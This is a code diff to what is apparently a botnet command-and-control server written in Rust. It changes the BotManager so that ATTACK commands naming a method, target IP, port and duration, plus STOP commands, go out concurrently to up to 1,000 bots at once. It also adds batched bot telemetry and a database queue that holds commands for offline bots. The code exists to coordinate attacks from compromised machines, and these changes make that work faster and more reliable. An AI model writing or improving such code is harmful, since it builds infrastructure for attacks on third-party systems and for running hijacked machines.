@@ -7,6 +7,7 @@ use serde::{Deserialize, Serialize};
 use sha2::{Sha256, Digest};
 use dashmap::DashMap;
 use sqlx::{SqlitePool, Row};
+use futures::stream::{self, StreamExt};
 
 /// Bot token information for authentication
 #[derive(Debug, Clone, Serialize, Deserialize)]
@@ -74,6 +75,7 @@ pub struct BotManager {
     bots: Arc<DashMap<Uuid, Arc<Bot>>>,
     max_connections: usize,
     pool: SqlitePool,
+    telemetry_buffer: Arc<Mutex<Vec<(Uuid, f32, f32, DateTime<Utc>)>>>,
 }
 
 impl BotManager {
@@ -82,6 +84,7 @@ impl BotManager {
             bots: Arc::new(DashMap::new()),
             max_connections,
             pool,
+            telemetry_buffer: Arc::new(Mutex::new(Vec::new())),
         }
     }
     
@@ -226,12 +229,38 @@ impl BotManager {
     }
     
     pub async fn log_telemetry(&self, bot_id: Uuid, cpu: f32, mem: f32) {
-        let _ = sqlx::query("INSERT INTO bot_telemetry (bot_id, cpu_usage, memory_usage) VALUES (?, ?, ?)")
-            .bind(bot_id.to_string())
-            .bind(cpu)
-            .bind(mem)
-            .execute(&self.pool)
-            .await;
+        let mut buffer = self.telemetry_buffer.lock().await;
+        buffer.push((bot_id, cpu, mem, Utc::now()));
+        
+        // Flush if buffer gets too large
+        if buffer.len() >= 100 {
+            drop(buffer); // Release lock before flushing
+            self.flush_telemetry().await;
+        }
+    }
+
+    pub async fn flush_telemetry(&self) {
+        let mut buffer = self.telemetry_buffer.lock().await;
+        if buffer.is_empty() {
+            return;
+        }
+        
+        let batch: Vec<_> = buffer.drain(..).collect();
+        drop(buffer); // Release lock
+        
+        // Use a transaction for batch insert
+        if let Ok(mut tx) = self.pool.begin().await {
+            for (bot_id, cpu, mem, time) in batch {
+                let _ = sqlx::query("INSERT OR REPLACE INTO bot_telemetry (bot_id, cpu_usage, memory_usage, last_updated) VALUES (?, ?, ?, ?)")
+                    .bind(bot_id.to_string())
+                    .bind(cpu)
+                    .bind(mem)
+                    .bind(time)
+                    .execute(&mut *tx)
+                    .await;
+            }
+            let _ = tx.commit().await;
+        }
     }
 
     pub async fn cleanup_dead_bots(&self, timeout_secs: i64) {
@@ -256,11 +285,17 @@ impl BotManager {
         let command = format!("STOP {}\n", attack_id);
         let bots = self.get_all_bots().await;
         
-        for bot in bots {
-            if let Err(e) = bot.cmd_tx.send(command.clone()).await {
-                tracing::debug!("Failed to send stop command to bot: {}", e);
-            }
-        }
+        // Use bounded concurrency to avoid overwhelming the scheduler
+        stream::iter(bots)
+            .for_each_concurrent(1000, |bot| {
+                let cmd = command.clone();
+                async move {
+                    if let Err(e) = bot.cmd_tx.send(cmd).await {
+                        tracing::debug!("Failed to send stop command to bot: {}", e);
+                    }
+                }
+            })
+            .await;
     }
     
     /// Broadcast attack command to all bots
@@ -269,11 +304,17 @@ impl BotManager {
         let command = format!("ATTACK {} {} {} {} {}\n", attack_id, method, ip, port, duration);
         let bots = self.get_all_bots().await;
         
-        for bot in bots {
-            if let Err(e) = bot.cmd_tx.send(command.clone()).await {
-                tracing::debug!("Failed to send attack command to bot: {}", e);
-            }
-        }
+        // Use bounded concurrency
+        stream::iter(bots)
+            .for_each_concurrent(1000, |bot| {
+                let cmd = command.clone();
+                async move {
+                    if let Err(e) = bot.cmd_tx.send(cmd).await {
+                        tracing::debug!("Failed to send attack command to bot: {}", e);
+                    }
+                }
+            })
+            .await;
     }
 
     /// Get all currently active attacks from the database
@@ -302,6 +343,48 @@ impl BotManager {
             }
         }
         active_attacks
+    }
+
+    /// Queue a command for a bot (if offline)
+    pub async fn queue_command(&self, bot_id: Uuid, command: &str) -> Result<(), String> {
+        sqlx::query("INSERT INTO pending_commands (bot_id, command) VALUES (?, ?)
+")
+            .bind(bot_id.to_string())
+            .bind(command)
+            .execute(&self.pool)
+            .await
+            .map_err(|e| format!("Database error: {}", e))?;
+        Ok(())
+    }
+
+    /// Get and remove pending commands for a bot
+    pub async fn get_pending_commands(&self, bot_id: Uuid) -> Vec<String> {
+        let rows = sqlx::query("SELECT id, command FROM pending_commands WHERE bot_id = ? ORDER BY created_at ASC")
+            .bind(bot_id.to_string())
+            .fetch_all(&self.pool)
+            .await
+            .unwrap_or_default();
+            
+        let mut commands = Vec::new();
+        let mut ids = Vec::new();
+        
+        for row in rows {
+            let id: i64 = row.get("id");
+            let cmd: String = row.get("command");
+            commands.push(cmd);
+            ids.push(id);
+        }
+        
+        if !ids.is_empty() {
+            for id in ids {
+                let _ = sqlx::query("DELETE FROM pending_commands WHERE id = ?")
+                    .bind(id)
+                    .execute(&self.pool)
+                    .await;
+            }
+        }
+        
+        commands
     }
 }
 
